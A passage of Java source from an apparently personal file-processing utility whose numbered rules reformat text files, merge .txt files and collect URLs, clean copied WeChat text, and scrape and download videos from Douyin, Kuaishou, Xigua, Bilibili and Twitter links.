				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->  把当前文件所有的内容转为一行    File=" + fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return " 把 当前的 所有 内容 都 转为 1 一行的 内容 的字符串 (多用于输入命令)  ";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}
	}

	class MakeOneLine_As_BlockWith_MD_Format_Rule_40 extends Basic_Rule {

		MakeOneLine_As_BlockWith_MD_Format_Rule_40() {
			super(40, false);

		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

//                ArrayList<String>  fixedStrArr =   clearChinese_Rule_13(fileItem);
				ArrayList<String> fixedStrArr = add_md_code_block_format_Rule_40(fileItem);
				System.out.println("════════════" + "输出文件 Begin " + "════════════");
				for (int j = 0; j < fixedStrArr.size(); j++) {
					System.out.println(fixedStrArr.get(j));
				}
				System.out.println("════════════" + "输出文件 End " + "════════════");
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->  把当前文件的每一行 都 转为 System.out.println(xx) 的内容   File="
						+ fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return "  把当前文件的每一行 都 转为 ``` md code-block ``` 格式字样的内容 ";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}

	}

	class MakeAllTxt_Content_To_OneFile_Rule_39 extends Basic_Rule {

		ArrayList<File> allTxtFile;

		MakeAllTxt_Content_To_OneFile_Rule_39(boolean mIsInputDirAsSearchPoint) {
			super(39);
			isInputDirAsSearchPoint = mIsInputDirAsSearchPoint;
			allTxtFile = new ArrayList<File>();

		}

		MakeAllTxt_Content_To_OneFile_Rule_39() {
			super(39, false);
			allTxtFile = new ArrayList<File>();
		}

		@SuppressWarnings("unchecked")
		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			ArrayList<String> realFileNameList = new ArrayList<String>();

			File currentTxtFile = curInputFileList.get(0);
			File dirFile = curInputFileList.get(0).getParentFile();
			ArrayList<File> allTxtFileList = getAllSubFile(dirFile, ".txt");

			ArrayList<String> allTxtContentList = new ArrayList<String>();
			ArrayList<String> allUriContentList = new ArrayList<String>();

			int txtIndex = 1;
			String url_tip = "";
			if (allTxtFileList != null) {

				allTxtFileList.sort(mFileDateComparion_New_Old);

				allTxtContentList.add(
						"═══════════════════ txt_file_count[" + (allTxtFileList.size() - 1) + "] ═══════════════════");

				System.out.println("allTxtFileList = " + allTxtFileList.size());
				for (int i = 0; i < allTxtFileList.size(); i++) {

					File txtFile = allTxtFileList.get(i);
					if (txtFile.getAbsolutePath().equals(currentTxtFile.getAbsolutePath())) {
						continue;
					}

					System.out.println("txt[" + txtIndex + "]  txtFile=[" + txtFile.getAbsolutePath() + "]");

					String dateStr = getDateStrFromLongStamp(txtFile.lastModified()); // "yyyy-MM-dd_HH:mm:ss"

					ArrayList<String> curTxtFileContentList = ReadFileContentAsList(txtFile);

					String tip = "______ txt[" + txtIndex + "] date[" + dateStr + "] ______";

					allTxtContentList.add(tip);
					allTxtContentList.addAll(curTxtFileContentList);
					allTxtContentList.add("");

					// 检测当前文件的 每一行 是否 有 url
					for (int j = 0; j < curTxtFileContentList.size(); j++) {
						String lineStr = curTxtFileContentList.get(j);
						ArrayList<String> oneLineUrlList = new ArrayList<String>(); // 一行 中 可能 多个 url 列表
						String strLine_trim_clearChinese = clearChinese(lineStr.trim());
						calculUrlInOneLine(strLine_trim_clearChinese, oneLineUrlList);

						if (oneLineUrlList != null && oneLineUrlList.size() > 0) {

							allUriContentList.addAll(oneLineUrlList);
						}

					}

					txtIndex++;

				}

				url_tip = "═══════════════" + " url_count [" + allUriContentList.size() + "] " + "═══════════════";

				allUriContentList.sort(new Comparator<String>() {
					@Override
					public int compare(String o1, String o2) {
						return o1.compareTo(o2);
					}
				});

				allTxtContentList.add(url_tip);
				allTxtContentList.addAll(allUriContentList);
				allTxtContentList.add(url_tip);

			}

			allTxtContentList.add(0, url_tip);

			writeContentToFile(currentTxtFile, allTxtContentList);
			NotePadOpenTargetFile(currentTxtFile.getAbsolutePath());

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		void calculUrlInOneLine(String rowString, ArrayList<String> urlList) {

			String[] strArrRow = null;
			String fixStr = "";

//	        if(str.trim().startsWith("http:") || str.trim().startsWith("https:") ||
//	                str.trim().startsWith("thunder:") ||   str.trim().startsWith("magnet::") ){

			if (rowString != null) {
				fixStr = new String(rowString);
				// http://xxxxxx/sahttp:// 避免出现 http://http: 连着的情况 起码也要使得间隔一个空格
				fixStr = fixStr.replace("http:", " http:");
				fixStr = fixStr.replace("https:", " https:");
				fixStr = fixStr.replace("thunder:", " thunder:");
				fixStr = fixStr.replace("magnet:", " magnet:");
				strArrRow = fixStr.split(" ");
			}

			if (strArrRow != null && strArrRow.length > 0) {

				for (int i = 0; i < strArrRow.length; i++) {
					String mCurContent = strArrRow[i];
					if (mCurContent == null || mCurContent.trim().equals("")) {
						continue;
					}

					boolean isUrl = toJudgeUrl(mCurContent);
					if (isUrl) {
						urlList.add(clearChinese(mCurContent).trim());

					}

				}

			}

		}

		public boolean toJudgeUrl(String str) {
			boolean isUrl = false;

			if (str.trim().toLowerCase().startsWith("http:") || str.toLowerCase().trim().startsWith("https:")
					|| str.toLowerCase().trim().startsWith("thunder:")
					|| str.toLowerCase().trim().startsWith("magnet:")) {

				return true;
			}

			return isUrl;
		}

		@Override
		String simpleDesc() {
			return " 把当前 目录下的 子目录 孙目录下 的 所有的 Txt文件 集合起来 以时间排序 打印到当前打开的文件 !";
		}

	}

	class Fixed_PCWeCharContent_KeepUsedInfo_Rule_38 extends Basic_Rule {

		Fixed_PCWeCharContent_KeepUsedInfo_Rule_38() {
			super(38, false);
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				File fileItem = curInputFileList.get(i);

//                ArrayList<String>  fixedStrArr =   clearChinese_Rule_13(fileItem);
				ArrayList<String> fixedStrArr = clearPC_DuoYu_Content(fileItem);
				System.out.println("════════════" + "输出文件 Begin " + "════════════");
				for (int j = 0; j < fixedStrArr.size(); j++) {
					System.out.println(fixedStrArr.get(j));
				}
				System.out.println("════════════" + "输出文件 End " + "════════════");
				writeContentToFile(I9_Temp_Text_File, fixedStrArr);
				NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
				System.out.println("rule_" + rule_index + " ->  把当前文件的每一行 都 转为 System.out.println(xx) 的内容   File="
						+ fileItem.getAbsolutePath());
			}

			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);
		}

		@Override
		String simpleDesc() {
			return "  去除在PC微信中多选复制文本出现的多余内容 只保留有用信息的规则 ";
		}

		// 3. 如果当前 执行 错误 checkParams 返回 false 那么 将 打印这个函数 说明错误的可能原因
		@Override
		void showWrongMessage() {
			System.out.println("当前 type 索引 " + rule_index + " 执行错误  可能是输入参数错误 请检查输入参数!");
			System.out.println(" errorMsg = " + errorMsg);
		}

		// 4. 当前 rule的 说明 将会打印在 用户输入为空时的 提示语句！
		@Override
		String ruleTip(String type, int index, String batName, OS_TYPE curType) {
			String itemDesc = "";
			if (curType == OS_TYPE.Windows) {
				itemDesc = batName.trim() + "  " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			} else {
				itemDesc = batName.trim() + " " + type + "_" + index + "    [索引 " + index + "]  描述:" + ""
						+ simpleDesc();
			}

			return itemDesc;
		}

		public ArrayList<String> clearPC_DuoYu_Content(File srcFile) {
			ArrayList<String> newContent = new ArrayList<String>();

			File curFile = srcFile;
			ArrayList<String> clearTagList = new ArrayList<String>();
			clearTagList.add("[图片]");
			clearTagList.add("[语音聊天]");
			clearTagList.add("[视频聊天]");
			clearTagList.add("[文件]");
			clearTagList.add("[视频]");
			clearTagList.add("[语音]");
			clearTagList.add("[地理位置]");

			if (curFile != null) {

				FileReader curReader;
				try {

					curReader = new FileReader(curFile);

					BufferedReader curBR = new BufferedReader(
							new InputStreamReader(new FileInputStream(curFile), "utf-8"));
					String oldOneLine = "";
					String newOneLine = "";

					while (oldOneLine != null) {

						oldOneLine = curBR.readLine();
						if (oldOneLine == null || oldOneLine.trim().isEmpty()) {
							continue;
						}

						// 去除 以 : 结尾的 字符串行
						if (oldOneLine.endsWith(":")) {
							continue;
						}

						if (clearTagList.contains(oldOneLine)) {
							// 如果包含 [图片] 类型字符串 那么也过滤
							continue;
						}

						newContent.add(oldOneLine.trim());
					}
					curBR.close();

				} catch (IOException e) {
					e.printStackTrace();
				}
			} else {
				System.out.println("Failed !");
			}
			return newContent;
		}

	}

	static class BliBliVideoInfo { // 真实项目中不推荐直接使用`public`哦😯

		public String videoName;
		public JSONObject videoInfo;
		public String videoBaseUrl;
		public String audioBaseUrl;
		public String videoBaseRange;
		public String audioBaseRange;
		public String videoSize;
		public String audioSize;

		@Override
		public String toString() {
			// TODO Auto-generated method stub
			return "\n videoName[ " + videoName + " ] \n videoBaseUrl[ " + videoBaseUrl + " ]  \naudioBaseUrl[ "
					+ audioBaseUrl + " ]  \nvideoSize[ " + videoSize + " ]   \naudioSize[ " + audioSize + " ]";
		}
	}

	public static class TwitterVideo {
		public long duration;
		public long size;
		public String url;

		@Override
		public String toString() {
			// TODO Auto-generated method stub
			return "[url]=[ " + url + " ]" + "  [size]=[" + size + "]" + "  [duration]=[" + duration + "]";
		}
	}

	static int download_failed_time = 0;

	class Analysis_URI_IN_Txt_Download_DouYinMP4_Rule_55 extends Basic_Rule {

		File ChromeDriverFile;
		String error_string_item;

// String targetPath = "奇怪，刚刚和妈妈的衣架子交心攀谈后，怎么感觉头上有一圈星星呢～ https://v.kuaishou.com/6Rq0gB 复制此链接，打开【快手App】直接观看！";

		ArrayList<String> videoUrlList;
		ArrayList<String> url_name_LogList; // 用于保存url 和 名称的Log条目
		ArrayList<String> urlList; // 在 url 中 检测到的 mp4 文件 比如 https://v.kuaishou.com/6Rq0gB
		String videoSavePath = null; // 默认为 txt 文件所在 目录下 新建 抖音 mp4 文件

		String timeStamp_Str = null;
		ArrayList<String> urlStrList; // url 字符串列表
		int index_download;

		Analysis_URI_IN_Txt_Download_DouYinMP4_Rule_55() {
			super(55, false);
			urlList = new ArrayList<String>();
			timeStamp_Str = getTimeStamp();
			index_download = 1;
			videoUrlList = new ArrayList<String>();
			urlStrList = new ArrayList<String>();
			url_name_LogList = new ArrayList<String>();
			ChromeDriverFile = new File(zbinPath + File.separator + "G2_chromedriver_v91.exe");
		}

		@Override
		boolean checkParamsOK(File shellDir, String type2Param, ArrayList<String> otherParams) {
			// TODO Auto-generated method stub

			return super.checkParamsOK(shellDir, type2Param, otherParams);
		}

		@Override
		void showWrongMessage() {
			// TODO Auto-generated method stub
			super.showWrongMessage();
		}

		@Override
		String simpleDesc() {
			return "  检测 当前 txt文件中的 url 路径(抖音 头条 快手 tw bli 视频)   并尝试下载这个 url 对应的文件到本地 tile_时间戳.mp4 并在temp文件打印url列表";
		}

		@Override
		ArrayList<File> applyOperationRule(ArrayList<File> curFileList, HashMap<String, ArrayList<File>> subFileTypeMap,
										   ArrayList<File> curDirList, ArrayList<File> curRealFileList) {
			for (int i = 0; i < curInputFileList.size(); i++) {
				ArrayList<String> allContentList = new ArrayList<String>();
				File targetFile = curInputFileList.get(i);
				String fileName = getFileNameNoPointNoLowerCase(targetFile.getName());
				ArrayList<String> allContent = ReadFileContentAsList(targetFile);

				if (targetFile.exists() && targetFile.isFile()) {
					videoSavePath = targetFile.getParentFile().getAbsolutePath();
				}

				if (videoSavePath == null) {
					if (targetFile.exists() && targetFile.isFile()) {
						videoSavePath = targetFile.getParentFile().getAbsolutePath();
					}
				}

				if (allContent.size() > 0) {
					for (int j = 0; j < allContent.size(); j++) {
						String oneLine = allContent.get(j);
						toGetUrlFromOneLine_And_InitUrlList(oneLine);

					}

					if (urlList.size() == 0) {
						System.out.println("当前执行 " + rule_index + " 规则失败  读取文件中的 http-url数据失败!!");
						return null;
					}

					for (int j = 0; j < urlList.size(); j++) {
						String urlItem = urlList.get(j);

						String strLine_trim = urlItem.trim();
						String strLine_trim_clearChinese = clearChinese(strLine_trim);
						System.out
								.println("strItem[" + j + "]=" + "[" + strLine_trim_clearChinese + "]  On  One Line ");
						boolean isUrl = toJudgeUrl(strLine_trim_clearChinese);

						System.out.println("开始解析 url urlItem=" + urlItem);

						parseUrl(j, urlItem);
					}

				} else {
					System.out.println("当前执行 " + rule_index + " 规则失败  读取文件内容为空!!!");
				}

			}

			urlList.sort(new Comparator<String>() {
				@Override
				public int compare(String o1, String o2) {
					return o1.compareTo(o2);
				}
			});
//			SortString(videoUrlList);

//			writeContentToFile(I9_Temp_Text_File, videoUrlList);
			writeContentToFile(I9_Temp_Text_File, url_name_LogList);

			NotePadOpenTargetFile(I9_Temp_Text_File.getAbsolutePath());
			System.out.println("VideoURL 列表打印在 PATH: " + I9_Temp_Text_File.getAbsolutePath());
			return super.applyOperationRule(curFileList, subFileTypeMap, curDirList, curRealFileList);

		}

		public void parseUrl(int index, String url) {

			if (url.contains("v.kuaishou.com")) {
				ksParseUrl(url);
				videoUrlList.add(url);
			} else if (url.contains("v.douyin.com")) {
				douYinParseUrl(url);
				videoUrlList.add(url);
			} else if (url.contains("douyin")) {
				downRawVideo_WithUrl(url, url, "douyin", "douyin");
				videoUrlList.add(url);

			} else if (url.startsWith("https://profile.zjurl.cn/rogue/ugc/profile") && url.contains("user_id")) {
				// https://profile.zjurl.cn/rogue/ugc/profile/?version_code=851&version_name=80501&user_id=3346556174218692&media_id=1632586053830670&request_source=1&active_tab=dongtai&device_id=65&app_name=news_article&share_token=4c7776c5-9a34-443f-b7df-9e6e69c08f17&tt_from=copy_link&utm_source=copy_link&utm_medium=toutiao_android&utm_campaign=client_share?=推荐《Emath》的主页
				// - 今日头条
				// 获取 用户的id 去它的主页 拿取 所有的 该用户的视频 然后下载
				DownloadUserTouTiaoHomeVideo(url.trim());
			} else if (url.startsWith("https://www.ixigua.com/home/")) {
				DownloadUserTouTiaoHomeVideo_IXiGuaHome(url);
			} else if (url.contains("m.toutiaoimg.cn") || url.contains("ixigua") || url.contains("toutiao")) {
				TouTiao_XiGua_Download(index, url);
				videoUrlList.add(url);

			} else if (url.contains("https://www.bilibili.com/video")) {
				// https://www.bilibili.com/video/BV1xb4y1Z741?from=search&seid=15286481463758585446&spm_id_from=333.337.0.0
				BliBli_Download(index, url);
				videoUrlList.add(url);

			} else if (url.contains("https://twitter.com")) {
				// // https://twitter.com/PDChinese/status/1427649465826033672?s=19
				TW_Download(index, url);
				videoUrlList.add(url);

			}

		}

		// https://www.ixigua.com/home/3346556174218692
		public void DownloadUserTouTiaoHomeVideo_IXiGuaHome(String mIxiguaHomeUrl) {
			if (!mIxiguaHomeUrl.startsWith("https://www.ixigua.com/home/")) {

				System.out.println("当前 路径 " + mIxiguaHomeUrl + "  不是 https://www.ixigua.com/home/ 类型的主页路径 无法批量下载");

				return;
			}

			String homePageCode = getXiGua_BliBli_MainPageSource(mIxiguaHomeUrl);

			// 检测 这个 主页下的 href 文件
			if (homePageCode == null || "".equals(homePageCode)) {
				System.out.println("当前 获取到的 主页路径 " + homePageCode + " 得到的 html代码为空!  退出执行");
				return;
			}

			System.out.println("当前 获取到的 主页路径 " + homePageCode + " 得到的 html代码!  开始执行检测 href 视频操作!");
			TryHrefAnalysis(homePageCode);

		}
		// https://profile.zjurl.cn/rogue/ugc/profile/?version_code=851&version_name=80501&user_id=3346556174218692&media_id=1632586053830670&request_source=1&active_tab=dongtai&device_id=65&app_name=news_article&share_token=4c7776c5-9a34-443f-b7df-9e6e69c08f17&tt_from=copy_link&utm_source=copy_link&utm_medium=toutiao_android&utm_campaign=client_share?=推荐《Emath》的主页
		// - 今日头条

		public void DownloadUserTouTiaoHomeVideo(String mTouTiaoProfieUrl) {
			String user_id_raw = mTouTiaoProfieUrl.substring(mTouTiaoProfieUrl.indexOf("user_id="));

			String user_id = user_id_raw.substring(0, user_id_raw.indexOf("&")).replace("&", "").replace("user_id=",
					"");

			// https://www.ixigua.com/home/3346556174218692
			System.out.println(" DownloadUserTouTiaoHomeVideo  mTouTiaoProfieUrl=" + mTouTiaoProfieUrl);
			System.out.println(" DownloadUserTouTiaoHomeVideo  user_id_raw=" + user_id_raw);

			System.out.println(" DownloadUserTouTiaoHomeVideo  user_id=" + user_id);

			String touTiaoHomePage = "https://www.ixigua.com/home/" + user_id.trim();

			// xxzukgit

			String homePageCode = getXiGua_BliBli_MainPageSource(touTiaoHomePage);

			// 检测 这个 主页下的 href 文件
			if (homePageCode == null || "".equals(homePageCode)) {
				System.out.println("当前 获取到的 主页路径 " + homePageCode + " 得到的 html代码为空!  退出执行");
				return;
			}

			System.out.println("当前 获取到的 主页路径 " + homePageCode + " 得到的 html代码!  开始执行检测 href 视频操作!");
			TryHrefAnalysis(homePageCode);

		}

		String TryHrefAnalysis(String mPageHtmlCode) {
			StringBuilder mLogSB = new StringBuilder();
			ArrayList<String> allHrefList = new ArrayList<String>();
			ArrayList<String> allNumberHrefList = new ArrayList<String>();
			ArrayList<String> allNumberHttpLinkList = new ArrayList<String>();

			if (mPageHtmlCode == null || "".equals(mPageHtmlCode)) {

				System.out.println("当前获取到的 页面 代码 为 空  执行失败!  ");
				return "当前获取到的 页面 代码 为 空  执行失败!";
			}

			// 以 href="
			String[] rawHrefArr = mPageHtmlCode.split("href=\"");

			if (rawHrefArr == null) {
				System.out.println("当前获取到的 页面 代码  不包含关键字  rawHrefArr");
				return "当前获取到的 页面 代码  不包含关键字  rawHrefArr";

			}

			for (int i = 0; i < rawHrefArr.length; i++) {
				String rawHrefItem = rawHrefArr[i];
				System.out.println("rawHref[" + i + "] = " + rawHrefItem);
				mLogSB.append("rawHref[" + i + "] = " + rawHrefItem + "\n");
				if (rawHrefItem.contains("\"")) {
					String realHref = rawHrefItem.substring(0, rawHrefItem.indexOf("\""));
					allHrefList.add(realHref);

				}
			}

			for (int i = 0; i < allHrefList.size(); i++) {
				String realHref = allHrefList.get(i);

				System.out.println("realHref[" + i + "] = " + realHref);
				mLogSB.append("realHref[" + i + "] = " + realHref + "\n");
				String clearTagHref = realHref.replace("/", "").replace("?logTag=", "").trim();

				if (isNumeric(clearTagHref) && !allNumberHrefList.contains(clearTagHref)) {

					allNumberHrefList.add(clearTagHref);
				}

			}

			for (int i = 0; i < allNumberHrefList.size(); i++) {

				String realNumHref = allNumberHrefList.get(i);

				System.out.println("realNumHref[" + i + "] = " + realNumHref);
				mLogSB.append("realNumHref[" + i + "] = " + realNumHref + "\n");
				allNumberHttpLinkList.add("https://www.ixigua.com/" + realNumHref.trim());
			}

			String downlodLog = tryDownLoadXiGuaVideo(allNumberHttpLinkList);
			mLogSB.append(downlodLog);

			return mLogSB.toString();

		}

		String tryDownLoadXiGuaVideo(ArrayList<String> linkList) {
			StringBuilder downloadLogSB = new StringBuilder();

			if (linkList == null || linkList.size() == 0) {

				downloadLogSB.append("  当前 下载链接 集合 为 空 ");
				return downloadLogSB.toString();

			}

			for (int i = 0; i < linkList.size(); i++) {
				String linkItem = linkList.get(i);

				// zukgit 下载 方式
				XiGua_TouTiao_ParseUrl(i, linkItem);
				downloadLogSB.append("下载 link[" + i + "] " + linkItem + "  执行Over!");

			}

			return downloadLogSB.toString();

		}

		void BliBli_Download(int index, String urlitem) {
			if (!ChromeDriverFile.exists()) {
				System.out.println("当前 ChroneDriver.exe[" + ChromeDriverFile.getAbsolutePath()
						+ "] 文件不存在 请检查当前 chrome版本 并去 http://npm.taobao.org/mirrors/chromedriver/ 下载对应版本的 chromedriver.exe 才能执行 头条西瓜视频的下载 ");
				return;
			}

//			if(urlitem.startsWith("https://www.ixigua.com/") || urlitem.startsWith("https://m.toutiaoimg.cn/") ) {
			BliBli_ParseUrl(index, urlitem);
//			XiGua_TouTiao_ParseUrl(index,urlitem);
//			}

		}

		void TouTiao_XiGua_Download(int index, String urlitem) {
			if (!ChromeDriverFile.exists()) {
				System.out.println("当前 ChroneDriver.exe[" + ChromeDriverFile.getAbsolutePath()
						+ "] 文件不存在 请检查当前 chrome版本 并去 http://npm.taobao.org/mirrors/chromedriver/ 下载对应版本的 chromedriver.exe 才能执行 头条西瓜视频的下载 ");
				return;
			}

//			if(urlitem.startsWith("https://www.ixigua.com/") || urlitem.startsWith("https://m.toutiaoimg.cn/") ) {

			XiGua_TouTiao_ParseUrl(index, urlitem);
//			}

		}

		void BliBli_ParseUrl(int index, String url) {
			// String
			// url="https://www.bilibili.com/video/BV1xb4y1Z741?from=search&seid=15286481463758585446&spm_id_from=333.337.0.0";

			org.jsoup.nodes.Document document;
			String jiemi_base64_url = null;
			String base64_jiami_url = null;
			String NoMainUrl_VideoTag_url = null; // 对于 没有 main_url 但 有 <video src="http" //这样的页面的处理
			BliBliVideoInfo mBliBli_VIDEO_INFO = new BliBliVideoInfo();

			try {
				String mainHtml = getXiGua_BliBli_MainPageSource(url);
				document = Jsoup.parse(mainHtml);

				Element title = document.getElementsByTag("title").first();
				// 视频名称
				mBliBli_VIDEO_INFO.videoName = title.text();
				// 截取视频信息<script>window.__playinfo__=
				Pattern pattern = Pattern.compile("(?<=<script>window.__playinfo__=).*?(?=</script>)");
				Matcher matcher = pattern.matcher(mainHtml);
				if (matcher.find()) {
					String group = matcher.group();
//		            System.out.println("group = " + group);
					mBliBli_VIDEO_INFO.videoInfo = JSONObject.parseObject(group);
				} else {
					System.err.println("未匹配到视频信息，退出程序！");
					return;
				}
				getBliBliVideoInfo(url, mBliBli_VIDEO_INFO);

			} catch (Exception e) {
				System.out.println("XiGua_TouTiao_ParseUrl  Exception e =" + e);
			}
		}

		/**
		 * 解析视频和音频的具体信息
		 */
		public void getBliBliVideoInfo(String videoUrl, BliBliVideoInfo mBliBli_VIDEO_INFO) {
			// 获取视频的基本信息
			com.alibaba.fastjson.JSONObject videoInfo = mBliBli_VIDEO_INFO.videoInfo;
			System.out.println("videoInfo = " + videoInfo);
			com.alibaba.fastjson.JSONArray videoInfoArr = videoInfo.getJSONObject("data").getJSONObject("dash")
					.getJSONArray("video");
			mBliBli_VIDEO_INFO.videoBaseUrl = videoInfoArr.getJSONObject(0).getString("baseUrl");
			mBliBli_VIDEO_INFO.videoBaseRange = videoInfoArr.getJSONObject(0).getJSONObject("SegmentBase")
					.getString("Initialization");

			String USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36";

			HttpResponse videoRes = HttpRequest.get(mBliBli_VIDEO_INFO.videoBaseUrl).header("Referer", videoUrl)
					.header("Range", "bytes=" + mBliBli_VIDEO_INFO.videoBaseRange).header("User-Agent", USER_AGENT)
					.timeout(2000).execute();
			mBliBli_VIDEO_INFO.videoSize = videoRes.header("Content-Range").split("/")[1];

			// 获取音频基本信息
			com.alibaba.fastjson.JSONArray audioInfoArr = videoInfo.getJSONObject("data").getJSONObject("dash")
					.getJSONArray("audio");
			mBliBli_VIDEO_INFO.audioBaseUrl = audioInfoArr.getJSONObject(0).getString("baseUrl");
			mBliBli_VIDEO_INFO.audioBaseRange = audioInfoArr.getJSONObject(0).getJSONObject("SegmentBase")
					.getString("Initialization");
			HttpResponse audioRes = HttpRequest.get(mBliBli_VIDEO_INFO.audioBaseUrl).header("Referer", videoUrl)
					.header("Range", "bytes=" + mBliBli_VIDEO_INFO.audioBaseRange).header("User-Agent", USER_AGENT)
					.timeout(2000).execute();
			mBliBli_VIDEO_INFO.audioSize = audioRes.header("Content-Range").split("/")[1];

			System.out.println("VIDEO_INFO = 【" + mBliBli_VIDEO_INFO + "】");
			download_BliBli_File(videoUrl, mBliBli_VIDEO_INFO);
		}

		/**
		 * 下载音视频
		 */
		public void download_BliBli_File(String videoUrl, BliBliVideoInfo mBliBli_VIDEO_INFO) {
			// 保存音视频的位置

			String fileAddress_notype_str = videoSavePath + "/" + "blibli" + "_" + index_download + "_" + timeStamp_Str;
			fileAddress_notype_str = clearChinese(fileAddress_notype_str);
			fileAddress_notype_str = fileAddress_notype_str.replace(" ", "");
			fileAddress_notype_str = fileAddress_notype_str.replace("	", "");
			fileAddress_notype_str = fileAddress_notype_str.replace("！", "");
			fileAddress_notype_str = fileAddress_notype_str.replace("!", "");
			fileAddress_notype_str = fileAddress_notype_str.replace("，", "");
			fileAddress_notype_str = fileAddress_notype_str.replace("：", "");
			fileAddress_notype_str = fileAddress_notype_str.replace("《", "");
			fileAddress_notype_str = fileAddress_notype_str.replace("？", "");
			fileAddress_notype_str = fileAddress_notype_str.replace("。", "");

			// 下载视频
			File videoFile = new File(fileAddress_notype_str + "_video.mp4");
			String USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36";

			if (!videoFile.exists()) {
				System.out.println("--------------开始下载视频文件-------------- VIDEO_INFO.videoBaseUrl[ "
						+ mBliBli_VIDEO_INFO.videoBaseUrl + " ]  VIDEO_INFO.videoSize[" + mBliBli_VIDEO_INFO.videoSize
						+ "]");
				HttpResponse videoRes = HttpRequest.get(mBliBli_VIDEO_INFO.videoBaseUrl).header("Referer", videoUrl)
						.header("Range", "bytes=0-" + mBliBli_VIDEO_INFO.videoSize).header("User-Agent", USER_AGENT)
						.execute();
				videoRes.writeBody(videoFile);
				System.out.println("--------------视频文件下载完成--------------");
			}

			// 下载音频
			File audioFile = new File(fileAddress_notype_str + "_audio.mp4");
			if (!audioFile.exists()) {
				System.out.println("--------------开始下载音频文件--------------VIDEO_INFO.audioBaseUrl[ "
						+ mBliBli_VIDEO_INFO.audioBaseUrl + "]  VIDEO_INFO.audioSize[" + mBliBli_VIDEO_INFO.audioSize
						+ "]");
				HttpResponse audioRes = HttpRequest.get(mBliBli_VIDEO_INFO.audioBaseUrl).header("Referer", videoUrl)
						.header("Range", "bytes=0-" + mBliBli_VIDEO_INFO.audioSize).header("User-Agent", USER_AGENT)
						.execute();
				audioRes.writeBody(audioFile);
				System.out.println("--------------音频文件下载完成--------------");
			}

			/*
			 * Map<String, String> htmlParsers = new HashMap<>(); htmlParsers.put("Referer",
			 * videoUrl); htmlParsers.put("Range", "bytes=" + VIDEO_INFO.audioSize);
			 * htmlParsers.put("User-Agent", USER_AGENT);
			 * OkHttpUtils.get().url(VIDEO_INFO.audioBaseUrl).headers(htmlParsers).build().
			 * execute( new FileCallBack("D:/", VIDEO_INFO.videoName + ".mp3") {
			 *
			 * @Override public void onError(Call call, Exception e, int i) {
			 * e.printStackTrace(); }
			 *
			 * @Override public void onResponse(File file, int i) {
			 * System.out.println("获取到的数据:" + file.getAbsolutePath()); } });
			 */

			// 合并视频 音频 文件
			// ffmpeg -i video.mp4 -i audio.mp4 -c:v copy -c:a aac -strict experimental
			// output.mp4
			File outputFile = mergeBliBli_Video_Audio_Files(videoFile, audioFile, mBliBli_VIDEO_INFO,
					fileAddress_notype_str + ".mp4");

			if (outputFile != null && outputFile.exists() && outputFile.length() > 200) {
				System.out.println("当前 BliBli 视频文件下载成功 !!   把没有声音的mp4 以及 只有声音的mp4 文件删除");

				videoFile.delete();
				audioFile.delete();
				// 获取文件的 md值 并重命名为 mdxxxx.mp4
				String mdName = getMD5Three(outputFile.getAbsolutePath());
				String new_Md_Name = mdName + ".mp4";
				tryReName(outputFile, new_Md_Name);
				System.out.println("\n-----视频BliBli视频保存路径(MD名称)-----\n" + outputFile.getAbsolutePath());
